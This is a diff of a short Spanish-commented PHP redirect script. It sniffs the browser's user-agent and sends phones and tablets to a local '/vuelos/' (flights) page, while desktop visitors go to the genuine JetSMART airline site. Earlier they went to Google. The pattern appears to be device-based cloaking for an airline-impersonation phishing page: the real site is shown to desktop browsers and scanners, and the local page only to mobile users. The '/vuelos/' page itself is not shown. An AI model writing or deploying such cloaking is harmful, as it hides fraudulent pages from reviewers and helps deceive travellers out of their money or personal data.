@@ -1,39 +1,28 @@
 <?php
-// Función para detectar si es un dispositivo móvil
-function esMovil() {
-    $agente = $_SERVER['HTTP_USER_AGENT'];
-    $moviles = ['Android', 'iPhone', 'iPad', 'iPod', 'Opera Mini', 'IEMobile', 'Mobile'];
+// Función para detectar si es móvil o tablet
+function esMovilOTablet() {
+    $agente = strtolower($_SERVER['HTTP_USER_AGENT']);
 
-    foreach ($moviles as $movil) {
-        if (stripos($agente, $movil) !== false) {
+    // Lista básica de identificadores de móviles/tablets
+    $moviles = [
+        'iphone', 'ipod', 'ipad', 'android', 'blackberry', 'bb10',
+        'mini', 'windows phone', 'iemobile', 'mobi', 'tablet', 'kindle', 'playbook'
+    ];
+
+    foreach ($moviles as $dispositivo) {
+        if (strpos($agente, $dispositivo) !== false) {
             return true;
         }
     }
     return false;
 }
 
-// Si no es móvil, redirige a Google
-if (!esMovil()) {
-    header("Location: https://www.google.com/");
-    exit();
+// Redirección
+if (esMovilOTablet()) {
+    header("Location: /vuelos/");
+    exit;
+} else {
+    header("Location: https://www.jetsmart.com");
+    exit;
 }
 ?>
-
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <title>Redirigiendo...</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script>
-        // Redirige después de 1 segundo
-        setTimeout(function() {
-            window.location.href = "vuelos/index.html";
-        }, 1000); // 1000 milisegundos = 1 segundo
-    </script>
-</head>
-<body>
-    <h1>Espere un momento...</h1>
-    <p>.</p>
-</body>
-</html>
